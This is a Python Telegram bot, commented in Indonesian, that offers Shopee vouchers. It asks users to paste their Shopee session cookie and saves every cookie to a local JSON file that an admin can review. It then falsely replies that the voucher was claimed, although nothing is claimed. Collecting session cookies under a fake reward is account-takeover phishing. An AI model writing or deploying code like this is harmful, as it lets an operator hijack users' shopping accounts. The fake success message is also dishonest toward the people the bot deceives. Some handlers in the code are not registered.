import os
import logging
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters

# Logging
logging.basicConfig(level=logging.INFO)

# Token & Admin ID dari Railway Environment Variables
TOKEN = os.getenv("TOKEN")  # Isi dengan token bot kamu
ADMIN_ID = int(os.getenv("ADMIN_ID"))  # Isi dengan ID admin Telegram kamu

# Database klaim voucher (disimpan di file)
DATABASE_FILE = "klaim_data.json"

def load_data():
    if os.path.exists(DATABASE_FILE):
        with open(DATABASE_FILE, "r") as file:
            return json.load(file)
    return {}

def save_data(data):
    with open(DATABASE_FILE, "w") as file:
        json.dump(data, file, indent=4)

# Load data awal
klaim_data = load_data()

# Start Command
async def start(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("🔹 Klaim Voucher", callback_data="klaim_voucher")],
        [InlineKeyboardButton("📊 Cek Klaim", callback_data="cek_klaim")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Selamat datang! Pilih menu di bawah:", reply_markup=reply_markup)

# Klaim Voucher
async def klaim_voucher(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("Silakan kirimkan cookie Shopee kamu untuk klaim voucher.")

    return "MENUNGGU_COOKIE"

async def terima_cookie(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    username = update.message.from_user.username
    cookie = update.message.text

    # Simpan cookie & klaim data
    klaim_data[user_id] = {"username": username, "cookie": cookie, "jumlah_klaim": klaim_data.get(user_id, {}).get("jumlah_klaim", 0) + 1}
    save_data(klaim_data)

    # Proses klaim (gunakan cookie untuk klaim voucher - perlu tambahan script)
    await update.message.reply_text("✅ Voucher berhasil diklaim!")

# Cek Klaim (Admin Only)
async def cek_klaim(update: Update, context: CallbackContext):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Hanya admin yang bisa melihat data klaim.")
        return

    # Menampilkan daftar klaim
    pesan = "📊 **Laporan Klaim Voucher:**\n\n"
    for user_id, data in klaim_data.items():
        pesan += f"👤 @{data['username']} - {data['jumlah_klaim']} kali\n"

    await update.message.reply_text(pesan)

# Setup Bot
app = Application.builder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("cek_klaim", cek_klaim))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, terima_cookie))

# Jalankan Bot
if __name__ == "__main__":
    app.run_polling()
